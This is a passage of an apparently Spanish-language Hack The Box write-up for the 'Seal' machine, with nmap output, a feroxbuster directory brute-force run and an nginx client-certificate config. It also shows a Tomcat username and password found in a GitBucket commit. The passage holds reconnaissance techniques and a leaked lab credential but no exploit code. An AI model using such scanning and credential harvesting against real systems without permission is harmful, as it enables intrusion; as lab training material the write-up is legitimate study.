&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.1 &lt;span class=&#34;m&#34;&gt;401&lt;/span&gt; Unauthorized
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Date: Tue, &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 22:15:34 GMT
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Set-Cookie: &lt;span class=&#34;nv&#34;&gt;JSESSIONID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;node0pikwwm1ufkdt1sapwo4wabcqg2.node0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;Path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; HttpOnly
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Expires: Thu, &lt;span class=&#34;m&#34;&gt;01&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;1970&lt;/span&gt; 00:00:00 GMT
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf-8
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   GetRequest:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.1 &lt;span class=&#34;m&#34;&gt;401&lt;/span&gt; Unauthorized
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Date: Tue, &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 22:15:33 GMT
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Set-Cookie: &lt;span class=&#34;nv&#34;&gt;JSESSIONID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;node0onk9vj2as4e4hqd3903kmhjo0.node0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;Path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; HttpOnly
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Expires: Thu, &lt;span class=&#34;m&#34;&gt;01&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;1970&lt;/span&gt; 00:00:00 GMT
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf-8
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   HTTPOptions:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.1 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Date: Tue, &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 22:15:34 GMT
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Set-Cookie: &lt;span class=&#34;nv&#34;&gt;JSESSIONID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;node0l2xbmz674jwh13xgyl9imlaau1.node0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;Path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; HttpOnly
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Expires: Thu, &lt;span class=&#34;m&#34;&gt;01&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;1970&lt;/span&gt; 00:00:00 GMT
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf-8
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Allow: GET,HEAD,POST,OPTIONS
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   RPCCheck:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.1 &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; Illegal character &lt;span class=&#34;nv&#34;&gt;OTEXT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x80
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;iso-8859-1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;71&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Connection: close
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;h1&amp;gt;Bad Message 400&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason: Illegal character &lt;span class=&#34;nv&#34;&gt;OTEXT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x80&amp;lt;/pre&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   RTSPRequest:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.1 &lt;span class=&#34;m&#34;&gt;505&lt;/span&gt; Unknown Version
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;iso-8859-1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;58&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Connection: close
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;h1&amp;gt;Bad Message 505&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason: Unknown Version&amp;lt;/pre&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Socks4:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.1 &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; Illegal character &lt;span class=&#34;nv&#34;&gt;CNTL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x4
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;iso-8859-1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;69&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Connection: close
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;h1&amp;gt;Bad Message 400&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason: Illegal character &lt;span class=&#34;nv&#34;&gt;CNTL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x4&amp;lt;/pre&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Socks5:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.1 &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; Illegal character &lt;span class=&#34;nv&#34;&gt;CNTL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;iso-8859-1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;69&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Connection: close
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    &amp;lt;h1&amp;gt;Bad Message 400&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason: Illegal character &lt;span class=&#34;nv&#34;&gt;CNTL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x5&amp;lt;/pre&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-auth:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class=&#34;m&#34;&gt;401&lt;/span&gt; Unauthorized&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;0D
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Server returned status &lt;span class=&#34;m&#34;&gt;401&lt;/span&gt; but no WWW-Authenticate header.
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf-8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Jul 13 17:58:58 2021 -- 1 IP address (1 host up) scanned in 23.32 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;web-site&#34;&gt;Web Site&lt;/h2&gt;
&lt;p&gt;Encontramos una tienda en linea que no presenta ningun tipo de funcionalidad.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/seal/Screenshot_20210713_193638.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;directory-brute-forcing&#34;&gt;Directory Brute Forcing&lt;/h2&gt;
&lt;p&gt;Feroxbuster muestra una direccion que pertenece a Tomcat. Al visitar la direccion &lt;code&gt;/manager&lt;/code&gt; retorna Codigo &lt;a href=&#34;https://es.wikipedia.org/wiki/HTTP_403&#34;&gt;403&lt;/a&gt;, lo que significa que no estamos permitidos a acceder.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; Ï€ ~/htb/seal â¯ feroxbuster -u https://seal.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k

 ___  ___  __   __     __      __         __   ___
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /  &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;    /  &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_,    &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___
by Ben &lt;span class=&#34;s2&#34;&gt;&amp;#34;epi&amp;#34;&lt;/span&gt; Risher ğŸ¤“                 ver: 2.3.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ https://seal.htb/
 ğŸš€  Threads               â”‚ &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt;
 ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ğŸ‘Œ  Status Codes          â”‚ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200, 204, 301, 302, 307, 308, 401, 403, 405&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
 ğŸ’¥  Timeout &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;        â”‚ &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.3.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”“  Insecure              â”‚ &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
 ğŸ”ƒ  Recursion Depth       â”‚ &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
 ğŸ‰  New Version Available â”‚ https://github.com/epi052/feroxbuster/releases/latest
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ENTER&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; to use the Scan Cancel Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
&lt;span class=&#34;m&#34;&gt;302&lt;/span&gt;        0l        0w        0c https://seal.htb/images
&lt;span class=&#34;m&#34;&gt;302&lt;/span&gt;        0l        0w        0c https://seal.htb/admin
&lt;span class=&#34;m&#34;&gt;302&lt;/span&gt;        0l        0w        0c https://seal.htb/icon
&lt;span class=&#34;m&#34;&gt;302&lt;/span&gt;        0l        0w        0c https://seal.htb/css
&lt;span class=&#34;m&#34;&gt;302&lt;/span&gt;        0l        0w        0c https://seal.htb/js
&lt;span class=&#34;m&#34;&gt;302&lt;/span&gt;        0l        0w        0c https://seal.htb/manager
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;####################] - 10m   220545/220545  0s      found:6       errors:0&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;####################] - 10m   220545/220545  360/s   https://seal.htb/&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;gitbucket&#34;&gt;GitBucket&lt;/h1&gt;
&lt;p&gt;En el puerto 8080 encontramos GitBucket tras registrar e ingresar un usuario en el panel de registro vemos dos repositorios.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/seal/Screenshot_20210713_194030.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Segun la definicion, el primero es la tienda que se muestra en el puerto 80, el segundo se describe como un &lt;a href=&#34;https://docs.ansible.com/ansible/latest/user_guide/playbooks.html&#34;&gt;Playbook&lt;/a&gt; para administrar la tienda (Tomcat).&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/seal/Screenshot_20210713_194132.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;seal-market---repo&#34;&gt;Seal Market - Repo&lt;/h2&gt;
&lt;p&gt;Descubrimos en Seal_market un &lt;a href=&#34;http://seal.htb:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7?diff=split&#34;&gt;commit&lt;/a&gt; en el que se modifica el archivo &lt;strong&gt;tomcat-users.xml&lt;/strong&gt;, se muestra un usuario y contraseÃ±a (&lt;code&gt;tomcat:42MrHBf*z8{Z%&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/seal/Screenshot_20211113_153845.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;AdemÃ¡s vemos que la app (Seal Market) solo es una pagina estatica sin ninguna conexion a alguna base de datos.&lt;/p&gt;
&lt;p&gt;Tambien en la configuracion de &lt;strong&gt;nginx&lt;/strong&gt; (nginx/sites-available/default) vemos que no permite acceder a distintas rutas sin &lt;a href=&#34;https://smallstep.com/hello-mtls/doc/server/nginx&#34;&gt;autenticaciÃ³n mediante un certificado&lt;/a&gt;, en el caso de no estar autenticado retorna codigo 403 como en &lt;code&gt;/manager&lt;/code&gt;, tambien vemos configuracion para &lt;a href=&#34;https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/&#34;&gt;Reverse Proxy&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssl_certificate /var/www/keys/selfsigned.crt&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
ssl_certificate_key /var/www/keys/selfsigned.key&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
ssl_client_certificate /var/www/keys/selfsigned-ca.crt&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 
server &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        listen &lt;span class=&#34;m&#34;&gt;443&lt;/span&gt; ssl default_server&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        listen &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:443 ssl default_server&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 
 
        root /var/www/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        ssl_protocols TLSv1.1 TLSv1.2&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        ssl_verify_client optional&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

        index index.html index.htm index.nginx-debian.html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 
        server_name _&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 
        location /manager/html &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ssl_client_verify&lt;/span&gt; !&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; SUCCESS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
                        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; 403&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
                proxy_set_header        Host &lt;span class=&#34;nv&#34;&gt;$host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_set_header        X-Real-IP &lt;span class=&#34;nv&#34;&gt;$remote_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_set_header        X-Forwarded-For &lt;span class=&#34;nv&#34;&gt;$proxy_add_x_forwarded_for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_set_header        X-Forwarded-Proto &lt;span class=&#34;nv&#34;&gt;$scheme&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_pass          http://localhost:8000&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
                proxy_read_timeout  90&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
